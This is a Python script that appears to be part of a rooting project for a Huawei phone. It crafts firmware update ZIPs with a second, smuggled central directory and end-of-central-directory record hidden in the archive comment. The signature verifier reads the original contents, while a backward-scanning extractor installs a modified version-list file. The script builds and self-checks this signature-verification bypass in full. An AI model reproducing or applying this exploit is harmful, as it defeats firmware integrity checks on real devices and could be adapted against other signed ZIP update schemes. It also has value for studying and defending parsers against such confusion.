#!/usr/bin/env python3
"""
Same EOCD-confusion construction, with a robust EOCD locator.

`PK\x05\x06` is only four bytes, so it occurs by chance inside compressed payloads.
Finding "the first" or "the last" occurrence is therefore wrong in general - a
503 MB package will contain several. A genuine EOCD is the one whose comment
length accounts for the remainder of the file:

    eocd_pos + 22 + comment_len == file_size

There can legitimately be more than one such record in a crafted file, and that is
exactly the point: the first valid one is what the verifier parses, the last valid
one is what a backwards-scanning extractor (minzip) parses.
"""
import os
import struct
import zlib

ADDITIONS = """ANE-LX2J 9.1.0.132(C635E4R1P1)
9.1.0.132(C635E4R1P1)
C635E4R1P1
"""
TARGET = b"SOFTWARE_VER_LIST.mbn"
EOCD_SIG = b"PK\x05\x06"
CEN_SIG = b"PK\x01\x02"
CEN_FMT = "<IHHHHHHIIIHHHHHII"
LOC_FMT = "<IHHHHHIIIHH"
EOCD_FMT = "<IHHHHIIH"

OUTDIR = "/home/placeless/dev/p20-root/firmware/eocd"
JOBS = [
    ("/tmp/fw3/Software/dload/update_sd.zip", "update_sd.zip"),
    ("/tmp/fw3/Software/dload/ANE-L22J_hw_jp/update_sd_ANE-L22J_hw_jp.zip",
     "update_sd_ANE-L22J_hw_jp.zip"),
]


def find_eocds(buf):
    """All EOCD candidates whose comment length exactly accounts for the file."""
    out = []
    pos = buf.find(EOCD_SIG)
    n = len(buf)
    while pos != -1:
        if pos + 22 <= n:
            clen = struct.unpack("<H", buf[pos + 20:pos + 22])[0]
            if pos + 22 + clen == n:
                out.append(pos)
        pos = buf.find(EOCD_SIG, pos + 1)
    return out


def entries_of(buf, cd_off, cd_size):
    cd = buf[cd_off:cd_off + cd_size]
    out, p = [], 0
    while p < len(cd):
        assert cd[p:p + 4] == CEN_SIG, f"bad central header at {p}"
        f = struct.unpack(CEN_FMT, cd[p:p + 46])
        nlen, elen, clen = f[10], f[11], f[12]
        out.append(dict(ver_made=f[1], ver_need=f[2], flags=f[3], method=f[4],
                        mtime=f[5], mdate=f[6], crc=f[7], csize=f[8], usize=f[9],
                        disk_start=f[13], iattr=f[14], eattr=f[15], doff=f[16],
                        name=cd[p + 46:p + 46 + nlen],
                        extra=cd[p + 46 + nlen:p + 46 + nlen + elen],
                        cmt=cd[p + 46 + nlen + elen:p + 46 + nlen + elen + clen]))
        p += 46 + nlen + elen + clen
    assert p == len(cd)
    return out


def local_payload(buf, off, method, csize):
    n, e = struct.unpack("<HH", buf[off + 26:off + 30])
    raw = buf[off + 30 + n + e:off + 30 + n + e + csize]
    return zlib.decompress(raw, -15) if method == 8 else raw


def build(src, dst):
    orig = open(src, "rb").read()
    cands = find_eocds(orig)
    print(f"  EOCD candidates in the original: {[hex(c) for c in cands]}")
    pos = cands[-1] if cands else orig.rfind(EOCD_SIG)
    disk, cd_disk, n_disk, n_total, cd_size, cd_off, clen = struct.unpack(
        "<HHHHIIH", orig[pos + 4:pos + 22])
    assert pos + 22 + clen == len(orig)

    entries = entries_of(orig, cd_off, cd_size)
    hits = [e for e in entries if e["name"] == TARGET]
    assert len(hits) == 1, f"want exactly one {TARGET}, found {len(hits)}"
    e0 = hits[0]
    old_plain = local_payload(orig, e0["doff"], e0["method"], e0["csize"])
    new_plain = old_plain.rstrip(b"\n") + b"\n" + ADDITIONS.encode()

    co = zlib.compressobj(9, zlib.DEFLATED, -15)
    new_cdata = co.compress(new_plain) + co.flush()
    new_crc = zlib.crc32(new_plain) & 0xFFFFFFFF

    block_abs = pos + 22 + clen
    body = bytearray()
    body += struct.pack(LOC_FMT, 0x04034b50, 20, e0["flags"], 8, e0["mtime"],
                        e0["mdate"], new_crc, len(new_cdata), len(new_plain),
                        len(TARGET), 0) + TARGET
    new_local_abs = block_abs
    body += new_cdata
    cdn_rel = len(body)
    for e in entries:
        if e["name"] == TARGET:
            crc, csize, usize, method, doff = new_crc, len(new_cdata), len(new_plain), 8, new_local_abs
        else:
            crc, csize, usize, method, doff = e["crc"], e["csize"], e["usize"], e["method"], e["doff"]
        body += struct.pack(CEN_FMT, 0x02014b50, e["ver_made"], e["ver_need"], e["flags"],
                            method, e["mtime"], e["mdate"], crc, csize, usize,
                            len(e["name"]), len(e["extra"]), len(e["cmt"]),
                            e["disk_start"], e["iattr"], e["eattr"], doff)
        body += e["name"] + e["extra"] + e["cmt"]
    cdn_size = len(body) - cdn_rel
    body += struct.pack(EOCD_FMT, 0x06054b50, 0, 0, len(entries), len(entries),
                        cdn_size, block_abs + cdn_rel, 0)
    smuggled = bytes(body)

    out = orig[:pos + 20] + struct.pack("<H", clen + len(smuggled)) + orig[pos + 22:] + smuggled
    open(dst, "wb").write(out)
    return orig, out, new_plain, pos


os.makedirs(OUTDIR, exist_ok=True)
for src, name in JOBS:
    dst = os.path.join(OUTDIR, name)
    print("=" * 72)
    print(name)
    orig, out, new_plain, orig_eocd = build(src, dst)
    print(f"  {len(orig):,} -> {len(out):,} bytes (+{len(out)-len(orig):,})")

    cands = find_eocds(out)
    print(f"  EOCD candidates now: {[hex(c) for c in cands]}")
    assert orig_eocd in cands, "the original EOCD must remain valid"
    assert len(cands) >= 2, "expected the smuggled EOCD as well"

    def payload_at(eocd_pos):
        s = struct.unpack(EOCD_FMT, out[eocd_pos:eocd_pos + 22])
        es = entries_of(out, s[6], s[5])
        t = [e for e in es if e["name"] == TARGET][0]
        return local_payload(out, t["doff"], t["method"], t["csize"]), es

    first = min(c for c in cands)
    last = max(c for c in cands)
    v_body, ev = payload_at(first)
    m_body, em = payload_at(last)

    print(f"  verifier view  (first EOCD @{first:#x}): {len(v_body)} bytes, pristine={v_body != new_plain}")
    print(f"  extractor view (last  EOCD @{last:#x}): {len(m_body)} bytes, patched={m_body == new_plain}")
    print(f"  pre-EOCD bytes identical to original: {out[:first] == orig[:first]}")

    assert v_body != new_plain and m_body == new_plain
    assert out[:first] == orig[:first]

    for a in ev:
        if a["name"] == TARGET:
            continue
        b = [x for x in em if x["name"] == a["name"]][0]
        assert (a["doff"], a["csize"], a["method"]) == (b["doff"], b["csize"], b["method"]), a["name"]
    print("  every other entry resolves identically in both views: True")

print("\nboth packages built and verified")
